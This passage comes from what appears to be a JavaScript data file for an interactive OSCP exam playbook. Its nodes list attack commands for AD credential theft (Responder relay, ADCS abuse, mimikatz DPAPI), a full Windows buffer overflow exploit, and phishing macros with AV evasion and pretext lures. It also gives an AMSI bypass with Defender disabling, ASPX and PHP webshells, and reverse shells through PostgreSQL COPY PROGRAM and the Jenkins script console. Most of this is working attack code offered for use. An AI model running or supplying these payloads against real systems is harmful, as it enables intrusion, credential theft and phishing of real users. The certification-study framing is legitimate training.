      { label: "TA0007 — Discovery (post-shell)", next: "doc_discovery" },
      { label: "TA0040 — Impact (flags)", next: "doc_impact" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_discovery: {
    phase: "REPORT",
    title: "TA0007 — Discovery",
    body: "Post-shell enumeration. What did you find once inside? This section ties recon to lateral movement and shows situational awareness — you didn't just exploit and move on, you understood the environment.",
    cmd: `# TA0007 Discovery — note template
# Technique IDs to reference:
#   T1082 — System Information Discovery
#   T1049 — System Network Connections Discovery
#   T1033 — System Owner/User Discovery
#   T1087 — Account Discovery
#   T1069 — Permission Groups Discovery
#   T1016 — System Network Configuration Discovery
#   T1018 — Remote System Discovery
#   T1135 — Network Share Discovery

## Post-Shell Discovery — $ip

Shell as: [username + privilege level]

## System Info
hostname && whoami && id
uname -a          # Linux
systeminfo        # Windows

## Network Awareness
ip a / ipconfig   # Interfaces — any dual-homed?
ip route          # Subnets reachable
arp -a            # Other hosts seen recently
ss -tnp / netstat -ano  # Active connections

## Interesting Users / Groups
cat /etc/passwd | grep -v nologin  # Linux
net user && net localgroup administrators  # Windows

## Key Findings
- [Any new subnets discovered]
- [Other live hosts found]
- [Interesting shares, files, configs]

## Evidence
- Screenshot: ifconfig/ipconfig showing all interfaces
- Screenshot: arp table or other host discovery
- Note: any new IPs to add to scope`,
    warn: "Check for dual-homed machines every time — a second interface means a new subnet and potentially the pivot you need to reach the AD set.",
    choices: [
      { label: "TA0040 — Impact (flags)", next: "doc_impact" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_impact: {
    phase: "REPORT",
    title: "TA0040 — Impact (Flags)",
    body: "The proof section. This is what OffSec grades. Every flag needs the holy trinity in a single screenshot: whoami/id + hostname + ip + flag content. No exceptions.",
    cmd: `# TA0040 Impact — flag capture template
# Technique IDs:
#   T1565 — Data Manipulation (you achieved impact)
#   T1486 — Data Encrypted / T1496 — Resource Hijacking (conceptual)

## Flag Capture — $ip

### local.txt (low privilege)
# Linux
whoami && hostname && ip a && cat /home/*/local.txt 2>/dev/null || find / -name local.txt 2>/dev/null -exec cat {} \;

# Windows
whoami && hostname && ipconfig && type C:\Users\*\Desktop\local.txt

### proof.txt (root / SYSTEM)
# Linux
id && hostname && ip a && cat /root/proof.txt

# Windows — MUST use interactive shell (not web shell)
whoami && hostname && ipconfig && type C:\Users\Administrator\Desktop\proof.txt

## Flag Log
| Machine IP | User Flag (local.txt) | Root Flag (proof.txt) | Time |
|------------|----------------------|----------------------|------|
| $ip        | [hash value]         | [hash value]         | 00:00|

## Evidence Requirements
- ✅ local.txt: whoami + hostname + ip + flag — SINGLE screenshot
- ✅ proof.txt: whoami (root/SYSTEM) + hostname + ip + flag — SINGLE screenshot
- ✅ proof.txt on Windows captured via interactive shell only`,
    warn: "Windows proof.txt MUST be captured from an interactive shell — RDP, WinRM, or evil-winrm. A web shell screenshot alone will not be accepted by OffSec.",
    choices: [
      { label: "Final submission checklist", next: "doc_submit" },
      { label: "Back to tactic index", next: "reporting" },
      { label: "Next machine", next: "start" },
    ],
  },

  doc_submit: {
    phase: "REPORT",
    title: "Submission Checklist",
    body: "Stop hacking 90 minutes before the exam ends. You need this time. Rushing the submission has failed people who had all the flags. Work through this list methodically.",
    cmd: `# SUBMISSION CHECKLIST — Do not skip steps

## 1. Flag Verification
# Confirm all flags are logged with correct screenshots
grep -r "local\|proof" ~/results/*/screenshots/

## 2. Screenshot Audit — per machine
# For each machine confirm you have:
# [ ] Recon: nmap output with versions
# [ ] Foothold: exploit execution + shell callback
# [ ] local.txt: whoami + hostname + ip + flag (single frame)
# [ ] Privesc: vector identified + exploitation command
# [ ] proof.txt: root/SYSTEM + hostname + ip + flag (single frame)

## 3. Notes Completeness
# Walk every ATT&CK tactic node for each machine
# TA0043 Recon ✓ / TA0001 Access ✓ / TA0002 Exec ✓
# TA0004 Privesc ✓ / TA0006 Creds ✓ / TA0008 Lateral ✓ / TA0040 Impact ✓

## 4. Disconnect VPN
sudo killall openvpn
# Exam proctoring ends here — confirm with proctor

## 5. Build Report Archive
cd ~/results
zip -r oscp_report_$(date +%Y%m%d).zip */
md5sum oscp_report_$(date +%Y%m%d).zip

## 6. Upload
# OffSec submission portal — upload zip
# Note the confirmation number / email
# Do not close the browser until confirmed

## 7. Breathe
echo "Done."`,
    warn: "The MD5 hash proves your submission was not tampered with. Note it down before uploading. If the portal has issues, email support@offensive-security.com immediately with your hash.",
    choices: [
      { label: "Back to tactic index", next: "reporting" },
      { label: "Start a new machine", next: "start" },
    ],
  },

  rdp: {
    phase: "WINDOWS",
    title: "RDP (3389)",
    body: "RDP is everywhere on Windows targets. xfreerdp from Kali, pass-the-hash via restricted admin mode, credential spray. Always try creds you already have.",
    cmd: `xfreerdp /u:user /p:'password' /v:$ip /cert-ignore
xfreerdp /u:administrator /pth:NTLM_HASH /v:$ip /cert-ignore +clipboard

crackmapexec rdp $ip -u users.txt -p passwords.txt
crackmapexec rdp $ip -u administrator -H NTLM_HASH

nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $ip

# BlueKeep check (CVE-2019-0708) — DO NOT auto-exploit, can crash target
nmap -p 3389 --script rdp-vuln-ms12-020 $ip`,
    warn: "Pass-the-hash via RDP requires restricted admin mode to be enabled on the target.",
    choices: [
      { label: "Got RDP access — Windows foothold", next: "windows_post_exploit" },
      { label: "Need creds first", next: "bruteforce" },
      { label: "Got RDP/Windows version — searchsploit it", next: "searchsploit_web" },
      { label: "BlueKeep vulnerable — searchsploit", next: "searchsploit_web" },
    ],
  },

  responder: {
    phase: "AD",
    title: "Responder / LLMNR Poisoning",
    body: "Poison LLMNR/NBT-NS broadcasts to capture NTLMv2 hashes. Run early — let it collect in background while you enumerate. Relay if cracking fails.",
    cmd: `sudo responder -I eth0 -wdF

# Captured hashes appear in /usr/share/responder/logs/
cat /usr/share/responder/logs/*.txt

# Crack NTLMv2 (module 5600)
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ntlmv2.txt rockyou.txt -r best64.rule

# If cracking fails — relay instead (turn off SMB/HTTP in Responder.conf first)
sudo responder -I eth0 -wdF --lm
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -i  # interactive shell`,
    warn: "Disable SMB and HTTP in /etc/responder/Responder.conf before running ntlmrelayx — both cannot listen on the same port.",
    choices: [
      { label: "Captured and cracked hash", next: "creds_found" },
      { label: "Relayed hash — got shell", next: "windows_post_exploit" },
      { label: "No hashes captured — try other AD vectors", next: "ad_start" },
    ],
  },

  adcs: {
    phase: "AD",
    title: "AD Certificate Services (ESC1/ESC4)",
    body: "Misconfigured certificate templates let low-priv users enroll as Domain Admin. ESC1 is the most common — find it with Certipy.",
    cmd: `certipy find -u user@domain.com -p 'pass' -dc-ip $ip -vulnerable -stdout

# ESC1 — enroll as DA using vulnerable template
certipy req -u user@domain.com -p 'pass' \\
  -ca 'CA-NAME' -template 'VulnTemplate' \\
  -upn administrator@domain.com -dc-ip $ip

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip $ip
# Outputs NTLM hash for administrator

# ESC4 — write owner on template, modify to ESC1, exploit
certipy template -u user@domain.com -p 'pass' \\
  -template 'VulnTemplate' -save-old -dc-ip $ip

# Pass-the-hash with retrieved administrator hash
evil-winrm -i $ip -u administrator -H <NTLM_HASH>`,
    warn: "Always -save-old when modifying templates in ESC4 — restore after exploitation or you'll break the environment.",
    choices: [
      { label: "Got DA cert — authenticated as admin", next: "dcsync" },
      { label: "No vulnerable templates found", next: "ad_manual" },
    ],
  },

  dpapi: {
    phase: "WINDOWS",
    title: "DPAPI Credential Extraction",
    body: "DPAPI protects browser passwords, credential manager, and WiFi keys. Accessible as the user who encrypted them or as SYSTEM with the domain backup key.",
    cmd: `# Chrome saved passwords (as the user)
mimikatz "dpapi::chrome /in:%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data /unprotect" exit

# Credential Manager blobs
cmdkey /list
mimikatz "vault::cred /patch" exit
mimikatz "dpapi::cred /in:C:\\Users\\user\\AppData\\Local\\Microsoft\\Credentials\\<blob>" exit

# Find all DPAPI blobs
dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>nul
dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\* 2>nul

# Master keys needed to decrypt
dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect\\* 2>nul

# From Kali with domain backup key (DA required)
impacket-dpapi backupkeys --export -t domain/admin:'pass'@$ip`,
    warn: null,
    choices: [
      { label: "Found plaintext creds", next: "creds_found" },
      { label: "Got domain backup key — decrypt all blobs", next: "got_root_windows" },
    ],
  },

  exploit_readcheck: {
    phase: "RECON",
    title: "Read the Exploit — Before You Fire",
    body: "You found a public exploit. This is the step most people skip. Running an exploit you haven't read is how you waste 45 minutes on the wrong version, crash the service, or backdoor your own machine. 90 seconds of reading saves hours. The exploit code is telling you exactly what it does — read it.",
    cmd: `# ── OPEN AND READ THE EXPLOIT ────────────
searchsploit -x <EDB-ID>
# Or if already copied:
cat exploit.py | head -60    # read the header comments first
# Most exploits document their usage, target version, and requirements
# at the top of the file

# ── THE 8-POINT CHECKLIST ─────────────────
# Work through these before typing python3 exploit.py:

# 1. VERSION MATCH — does this exploit target YOUR exact version?
#    "Tested on: Apache 2.4.49"  ← does your nmap match?
#    Version mismatches are the #1 reason exploits fail silently
cat targeted.txt | grep -i <service>

# 2. REQUIRED ARGUMENTS — what does it need?
#    Usage: exploit.py <URL> <LHOST> <LPORT>
#    or: exploit.py -t TARGET -p PORT -u USER -p PASS
#    Run it with no args first:
python3 exploit.py

# 3. HARDCODED VALUES — are there IPs that need changing?
#    grep for common hardcoded patterns:
grep -iE "127\.0\.0\.1|192\.168\.|10\.10\.|lhost|lport|YOUR_IP|attacker" exploit.py
#    Replace any hardcoded Kali IP with your tun0 IP

# 4. LANGUAGE VERSION — Python 2 or 3?
head -1 exploit.py    # check shebang: #!/usr/bin/python vs #!/usr/bin/python3
python3 exploit.py    # try 3 first
python2 exploit.py    # fall back if syntax errors

# 5. DEPENDENCIES — does it import anything non-standard?
grep "^import\|^from" exploit.py
# Missing module? pip3 install <module> --break-system-packages

# 6. WHAT DOES SUCCESS LOOK LIKE?
#    RCE → it prints command output or drops a shell
#    File read → it prints file contents
#    Auth bypass → it returns cookies or a token
#    DoS → AVOID on OSCP unless you have no choice
grep -iE "shell|exec|system|rce|cmd|command|whoami|id " exploit.py | head -10

# 7. PAYLOAD / CALLBACK SETUP — does it need a listener?
#    If it spawns a reverse shell you need nc/pwncat running first
grep -iE "reverse|callback|connect back|LHOST|LPORT" exploit.py
#    Start listener BEFORE running exploit:
pwncat-cs -lp $LPORT

# 8. COPY BEFORE MODIFYING ──────────────────
searchsploit -m <EDB-ID>
# NEVER modify /usr/share/exploitdb/ originals
# Work on the copy in your current directory

# ── MAKE YOUR MODIFICATIONS ───────────────
# Minimum changes for most exploits:
# - Update target IP/URL
# - Update LHOST to your tun0 IP
# - Update LPORT to your listener port
ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1`,
    warn: "The most common exploit failures: (1) wrong version — nmap shows 2.4.50, exploit targets 2.4.49; (2) hardcoded IP pointing at the exploit author's machine; (3) Python 2 script run with Python 3; (4) no listener running before the reverse shell callback fires. All four are caught by reading the exploit for 90 seconds before running it.",
    choices: [
      { label: "Exploit looks valid — set up listener and fire", next: "reverse_shell" },
      { label: "Needs credential we don't have", next: "bruteforce" },
      { label: "Python errors — needs porting", next: "exploit_compile" },
      { label: "Wrong version — back to searchsploit", next: "searchsploit_web" },
    ],
  },

  bof: {
    phase: "SHELL",
    title: "Buffer Overflow (Windows x86)",
    body: "PEN-200 BOF methodology: seven steps in strict order. Every step depends on the previous. Skipping steps is why exploits fail. This is a deterministic process — if the offset is right, the bad chars are clean, and the JMP ESP is valid, the exploit will work. Set up Immunity Debugger + mona.py on your Windows dev machine and work through each step. Do not proceed to the next step until the current one is confirmed.",
    cmd: `# ══ ENVIRONMENT SETUP ════════════════════
# Immunity Debugger: https://immunityinc.com/products/debugger/
# mona.py: copy to C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands\
# In Immunity console: !mona config -set workingfolder C:\mona\%p

# ══ STEP 1: FUZZING — find the crash length ═
# Send incrementally longer buffers until the service crashes
# Note: EXACTLY what length caused the crash

import socket, time
buffer = b"A" * 100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(("$ip", PORT))
        s.send(PREFIX + buffer + SUFFIX)
        s.close()
        print(f"Sent {len(buffer)} bytes — no crash")
        buffer += b"A" * 100
        time.sleep(1)
    except:
        print(f"Crashed at ~{len(buffer)} bytes")
        break

# ══ STEP 2: FIND EXACT OFFSET ═════════════
# Create a unique pattern of length = crash_length + 400 (buffer)
msf-pattern_create -l <CRASH_LENGTH>
# Send the pattern — note EIP value in Immunity when it crashes
msf-pattern_offset -l <CRASH_LENGTH> -q <EIP_VALUE>
# Output: "Exact match at offset XXXX"

# ══ STEP 3: CONFIRM EIP CONTROL ══════════
# Replace offset bytes with A, EIP with B (0x42424242), rest with C
python3 -c "print('A'*OFFSET + 'BBBB' + 'C'*(CRASH_LENGTH-OFFSET-4))"
# In Immunity: EIP should be 42424242 exactly
# ESP should point to the C buffer (your shellcode landing zone)

# ══ STEP 4: FIND BAD CHARS ════════════════
# Generate all bytes 0x01-0xFF (skip 0x00 — null always bad)
python3 -c "
bad_chars = b''
for i in range(1, 256):
    bad_chars += bytes([i])
print(repr(bad_chars))
"
# Send: A*OFFSET + BBBB + bad_chars
# In Immunity: Right-click ESP → Follow in Dump
# !mona bytearray -b '\x00'    # generate reference in mona
# !mona compare -f bytearray.bin -a <ESP_ADDRESS>
# Note EVERY bad char — including chars that corrupt the NEXT byte
# Re-run until mona says "Unmodified"

# ══ STEP 5: FIND JMP ESP ══════════════════
# Find a JMP ESP instruction in a module without ASLR/DEP/SafeSEH
# In Immunity:
!mona jmp -r esp -cpb "\x00<badchars>"
# Returns addresses — use one from a module without protections
# Note address in LITTLE ENDIAN format:
# Address: 0x625011AF → payload bytes: \xAF\x11\x50\x62

# Verify: set breakpoint on the JMP ESP address in Immunity
# Run exploit — debugger should pause at your breakpoint
# Then F7 → should land in C buffer (shellcode space)

# ══ STEP 6: GENERATE SHELLCODE ════════════
# Exclude null byte AND all bad chars found in step 4
msfvenom -p windows/shell_reverse_tcp \\
  LHOST=$LHOST LPORT=443 \\
  EXITFUNC=thread \\
  -b "\\x00\\xBAD\\xCHARS" \\
  -f py -v shellcode
# -f py         → Python format (buf = b"\x41...")
# -v shellcode  → variable named 'shellcode'
# EXITFUNC=thread → keeps service stable after shell exits
# Use port 443 or 80 — egress filtering on high ports

# ── CHECK SHELLCODE SIZE ──────────────────
# Your C buffer (ESP space) must be large enough for shellcode
# msfvenom windows/shell_reverse_tcp = ~341 bytes
# C buffer = CRASH_LENGTH - OFFSET - 4 bytes
# Must be > shellcode_size + nop_sled

# ══ STEP 7: BUILD FINAL EXPLOIT ════════════
import socket

offset = EXACT_OFFSET          # from step 2
retn = b"\xAF\x11\x50\x62"  # JMP ESP address LE from step 5
padding = b"\x90" * 16         # NOP sled — 16 bytes minimum
shellcode = (                   # paste msfvenom output here
    # paste msfvenom output here (buf = b"\x41...")
)

payload = b"A" * offset + retn + padding + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("$ip", PORT))
s.send(PREFIX + payload + SUFFIX)
s.close()
print("Sent. Check your listener.")`,
    warn: "NOP sled (\x90 * 16) goes between EIP/retn and shellcode — gives shellcode room to land. EXITFUNC=thread prevents crashing the service when your shell exits. The most common failures: (1) bad chars not fully eliminated — mona compare shows Unmodified before moving on; (2) shellcode too large for ESP buffer space — increase fuzz length to give more C-buffer room; (3) forgot to update LHOST in msfvenom; (4) high listener port blocked — use 443. If the shell fires and immediately dies: EXITFUNC=thread is the fix.",
    choices: [
      { label: "Shell caught — stabilize it", next: "shell_upgrade" },
      { label: "Exploit fires but shell dies — EXITFUNC", next: "bof" },
      { label: "EIP not 42424242 — recheck offset", next: "bof" },
    ],
  },

  client_side: {
    phase: "SHELL",
    title: "Client-Side Attacks",
    body: "You have a way to get a user to open something — email, share, phishing page. The full chain is: craft payload → encode to evade AV → embed in document → host → pretext the user → catch shell. Every step matters. AV catches obvious PowerShell strings — the number array + base64 encoding chain is what gets it through. Set up your listener before sending anything.",
    cmd: `# ══════════════════════════════════════════
# PATH 1: VBA MACRO IN WORD DOCUMENT
# ══════════════════════════════════════════

# ── STEP 1: GENERATE POWERSHELL REVERSE SHELL ──
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT -f ps1 -o shell.ps1
# OR write manually (more control over evasion):
# $c=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);...

# ── STEP 2: ENCODE PAYLOAD — NUMBER ARRAY + BASE64 ──
# This is the key evasion chain: string → char codes → base64
# In PowerShell on your Kali (or use Python):

python3 << 'EOF'
import base64

# Your PowerShell payload
payload = "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')"

# Step A: Convert to UTF-16LE bytes (PowerShell -EncodedCommand expects this)
encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
print(f"Base64 encoded:\n{encoded}\n")

# Step B: Number array (char codes) — VBA-friendly, evades string matching
nums = ','.join(str(ord(c)) for c in payload)
print(f"Number array:\n{nums}")
EOF

# ── STEP 3: VBA MACRO — EMBED IN WORD ────
# In Word: View > Macros > Create (or Alt+F11 > Insert > Module)
# Paste this macro:

# Method A — Direct PowerShell (simpler, more detectable):
# Sub AutoOpen()
#   Dim cmd As String
#   cmd = "powershell -nop -w hidden -enc BASE64_HERE"
#   Shell cmd, vbHide
# End Sub

# Method B — Number array decode (better AV evasion):
# Sub AutoOpen()
#   Dim str As String
#   Dim arr() As Integer
#   arr = Array(73,69,88,40,...)   ' your char code array here
#   Dim i As Integer
#   For i = 0 To UBound(arr)
#     str = str & Chr(arr(i))
#   Next i
#   Dim wsh As Object
#   Set wsh = CreateObject("WScript.Shell")
#   wsh.Run "powershell -nop -w hidden -enc " & str, 0, False
# End Sub

# Method C — Str split evasion (splits "powershell" string to dodge sig):
# Sub AutoOpen()
#   Dim ps As String
#   ps = "power" & "shell -nop -w hidden -enc BASE64_HERE"
#   CreateObject("WScript.Shell").Run ps, 0
# End Sub

# ── STEP 2b: SPLIT LONG PAYLOADS FOR VBA ──
# VBA has a 1024-character string literal limit per line
# Long base64 payloads MUST be split across multiple variables and concatenated
# Use this Python helper to auto-split any payload:

python3 << 'EOF'
# Paste your base64 payload into the variable below
payload = "BASE64_PAYLOAD_HERE"

chunk_size = 100   # safe chunk size for VBA string literals
chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]

print("' Paste this into your VBA module:")
print(f'Dim s1 As String, s2 As String')
for idx, chunk in enumerate(chunks):
    var = f's{idx+1}'
    print(f'{var} = "{chunk}"')

all_vars = ' & '.join([f's{i+1}' for i in range(len(chunks))])
print(f'Dim payload As String')
print(f'payload = {all_vars}')
print(f'CreateObject("WScript.Shell").Run "powershell -nop -w hidden -enc " & payload, 0')
EOF

# Example output for a split macro (3 chunks):
# Sub AutoOpen()
#   Dim s1 As String
#   Dim s2 As String
#   Dim s3 As String
#   s1 = "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAc"
#   s2 = "wAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADkAMgAuADEANgA4AC4ANAA1AC4AMQ"
#   s3 = "AyADMAJwAsADQANAA0ADQAKQA7AA=="
#   Dim payload As String
#   payload = s1 & s2 & s3
#   CreateObject("WScript.Shell").Run "powershell -nop -w hidden -enc " & payload, 0
# End Sub

# AutoOpen  = fires when document is opened (Word)
# Document_Open = same thing, different trigger name (use both for compatibility)
# Sub Document_Open()
#   AutoOpen
# End Sub

# ── STEP 4: HOST PAYLOAD + LISTENER ──────
python3 -m http.server 80   # serves shell.ps1
nc -nlvp $LPORT             # catches the shell

# ── STEP 5: SAVE AS .DOC (NOT .DOCX) ─────
# .docx is a zip — macros don't survive unless saved as:
# .doc  (Word 97-2003) — macros embedded directly
# .docm (macro-enabled) — modern but triggers more suspicion
# File > Save As > Word 97-2003 Document (.doc)

# ══════════════════════════════════════════
# PATH 2: WINDOWS LIBRARY FILE (.library-ms)
# ══════════════════════════════════════════
# Two-file attack: .library-ms points to WebDAV share → .lnk runs payload
# No macro warning — just needs user to open the folder

# Step 1: Set up WebDAV share on Kali (wsgidav)
pip install wsgidav --break-system-packages
mkdir /home/kali/webdav
wsgidav --host=0.0.0.0 --port=80 --root=/home/kali/webdav --auth=anonymous

# Step 2: Create .lnk shortcut in the webdav folder
# In PowerShell on Windows:
# $ws = New-Object -COM WScript.Shell
# $lnk = $ws.CreateShortcut("automatic_configuration.lnk")
# $lnk.TargetPath = "powershell"
# $lnk.Arguments = "-nop -w hidden -enc BASE64_PAYLOAD"
# $lnk.Save()
# Transfer the .lnk to /home/kali/webdav/

# Step 3: Create the .library-ms file
cat > /home/kali/config.library-ms << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType></templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://LHOST</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF
# Replace LHOST with your IP
# Send config.library-ms to target — when they open it,
# Windows connects to your WebDAV and shows the .lnk
# When they click the .lnk → shell fires

# ══════════════════════════════════════════
# PATH 3: HTA (HTML Application)
# ══════════════════════════════════════════
msfvenom -p windows/shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT -f hta-psh -o shell.hta
python3 -m http.server 80
# Deliver link: http://$LHOST/shell.hta
# User sees "Open / Save" dialog — runs with mshta.exe (often bypasses AV)

# ══════════════════════════════════════════
# PRETEXTING — MAKE THEM OPEN IT
# ══════════════════════════════════════════
# The document needs a reason to enable macros / click the link.
# Common pretexts:
#   "Security update required — enable content to view"
#   "Document protected — enable editing to read"
#   "Invoice attached — open to review charges"
#   "HR policy update — acknowledgment required"
# Add a blurred/greyed out fake document body so enabling macros
# appears to "unlock" the content — classic and still effective.
# Keep the filename believable: Invoice_2024.doc, HR_Policy_Update.doc`,
    warn: "Save Word docs as .doc not .docx — macros don't survive the zip conversion to .docx unless saved as macro-enabled format. The number array technique (converting payload to char codes then joining) is the key AV evasion — it breaks string-based signature matching. Always test your payload fires locally before sending. Listener must be running before delivery.",
    choices: [
      { label: "User opened doc — shell caught", next: "shell_upgrade" },
      { label: "Library file clicked — shell caught", next: "shell_upgrade" },
      { label: "AV killed the payload — encode harder", next: "amsi_bypass" },
      { label: "Need to serve file via email/share first", next: "client_side" },
    ],
  },

  amsi_bypass: {
    phase: "WINDOWS",
    title: "AMSI / AV Bypass",
    body: "AMSI blocks PowerShell payloads in memory. Patch it first, then load tools. Obfuscation handles signature-based AV.",
    cmd: `# AMSI patch (run in PS session first)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Or: base64 encoded AMSI bypass
$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
$b=$a.GetField('amsi'+'InitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Obfuscated download cradle (evades string detection)
$c = New-Object Net.WebClient
$c.DownloadString('http://$LHOST/tool.ps1') | IEX

# Invoke-Obfuscation (offline tool)
Invoke-Obfuscation -ScriptPath shell.ps1 -Command TOKEN\\ALL\\1

# Simple string concat to evade sig detection
$cmd = 'Inv'+'oke-Mi'+'mikatz'

# Defender exclusion (if admin)
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\\Windows\\Temp"`,
    warn: "AMSI patches are session-scoped — must run in every new PS session before loading tools.",
    choices: [
      { label: "AMSI bypassed — load tools", next: "windows_post_exploit" },
      { label: "Still blocked — try different bypass", next: "amsi_bypass" },
    ],
  },

  iis_aspx: {
    phase: "WEB",
    title: "IIS / ASPX Webshell",
    body: "IIS runs ASPX not PHP. If you can upload or write to the webroot, drop an ASPX shell. Default IIS path is C:\\inetpub\\wwwroot.",
    cmd: `# Generate ASPX shell
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx

# Simple ASPX webshell (upload and browse to it)
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Response.Write(Process.Start(new ProcessStartInfo("cmd.exe",
   "/c " + Request["cmd"]) { RedirectStandardOutput=true,
   UseShellExecute=false }).StandardOutput.ReadToEnd()); %>

# Access: http://$ip/shell.aspx?cmd=whoami

# IIS specific paths
C:\\inetpub\\wwwroot\\
C:\\inetpub\\wwwroot\\aspnet_client\\

# Check IIS version and config
type C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config
type C:\\inetpub\\wwwroot\\web.config`,
    warn: "IIS app pool runs as IIS_IUSRS by default — low priv. Check SeImpersonatePrivilege for potato escalation.",
    choices: [
      { label: "Webshell uploaded — got RCE", next: "reverse_shell" },
      { label: "Got shell — check token privs", next: "token_privs" },
      { label: "Upload blocked", next: "web_fuzz_deep" },
    ],
  },

  postgres: {
    phase: "RECON",
    title: "PostgreSQL (5432)",
    body: "PostgreSQL with COPY TO/FROM PROGRAM is RCE. Default postgres user often has no password. pg_hba.conf controls who can connect.",
    cmd: `psql -h $ip -U postgres
psql -h $ip -U postgres -p 5432

# Default creds: postgres:(blank)  postgres:postgres  postgres:password

# Once connected — RCE via COPY
psql> COPY shell FROM PROGRAM 'id';
psql> COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"';

# Read files
psql> COPY shell FROM '/etc/passwd';
psql> SELECT * FROM shell;

# Write files (if superuser)
psql> COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php';

# Enumerate
psql> \\l           # list databases
psql> \\c dbname    # connect to db
psql> \\dt          # list tables
psql> SELECT current_user, pg_postmaster_start_time();`,
    warn: null,
    choices: [
      { label: "RCE via COPY PROGRAM — got shell", next: "shell_upgrade" },
      { label: "Wrote webshell — got RCE", next: "reverse_shell" },
      { label: "Found creds in DB", next: "creds_found" },
    ],
  },

  mongodb: {
    phase: "RECON",
    title: "MongoDB (27017)",
    body: "Unauthenticated MongoDB exposes all databases. No auth by default in older versions. Dump everything — creds are often stored in plaintext.",
    cmd: `mongosh $ip
mongosh mongodb://$ip:27017

# If auth required
mongosh mongodb://admin:password@$ip:27017

# Enumerate and dump
> show dbs
> use <dbname>
> show collections
> db.<collection>.find()
> db.<collection>.find().pretty()

# Dump all
mongoexport --host $ip --db <db> --collection <col> --out dump.json
mongodump --host $ip --out ./mongodump/

# Look for users, passwords, tokens, API keys
> db.users.find()
> db.accounts.find()

# Check for credentials in all collections
> db.getCollectionNames().forEach(c => { print(c); db[c].findOne(); })`,
    warn: null,
    choices: [
      { label: "Found credentials", next: "creds_found" },
      { label: "Found app data — check for web vectors", next: "web_enum" },
    ],
  },

  jenkins: {
    phase: "WEB",
    title: "Jenkins (8080/8443)",
    body: "CI/CD server = code execution by design. Script console is RCE if you can reach it. Check anonymous access first — many dev instances skip auth entirely.",
    cmd: `nmap -p 8080,8443 -sV $ip
curl -s http://$ip:8080/api/json | jq .
curl -s http://$ip:8080/script          # admin-only but worth trying
curl -s http://$ip:8080/asynchPeople/   # user list (sometimes open)

# Default creds: admin:admin  admin:jenkins  jenkins:jenkins
# Brute force login
hydra -l admin -P rockyou.txt $ip http-post-form \\
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=loginError"

# Script console RCE (Groovy) — once authenticated
# http://$ip:8080/script
def cmd = "id"
def proc = cmd.execute()
proc.waitForOrKill(1000)
println proc.text

# Reverse shell via script console
String host="$LHOST"; int port=$LPORT; String cmd2="/bin/bash"
Process p=new ProcessBuilder(cmd2).redirectErrorStream(true).start()
Socket s=new Socket(host,port)
[p.inputStream,s.inputStream].each { it.eachByte { s.outputStream.write(it) } }

# Dump stored credentials (script console)
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
  Jenkins.instance, null, null)
creds.each { println it.id + ":" + it.username + ":" + it.password }

# CVE-2024-23897 — arbitrary file read (Jenkins < 2.441)
java -jar jenkins-cli.jar -s http://$ip:8080/ help "@/etc/passwd"`,
    warn: "Script console RCE runs as the Jenkins service user — often jenkins or root. Check for SSH keys and AWS creds in credential store.",
    choices: [
      { label: "Anonymous script console — got RCE", next: "reverse_shell" },
      { label: "Authenticated — dumped stored creds", next: "creds_found" },
      { label: "CVE-2024-23897 file read — found creds", next: "creds_found" },
      { label: "Need creds — brute force login", next: "bruteforce" },
    ],
  },

  vnc: {
    phase: "RECON",
    title: "VNC (5900-5906)",
    body: "VNC = graphical desktop access. No-auth instances are instant wins. Brute force is fast. Decrypt stored VNC passwords from config files if you find them.",
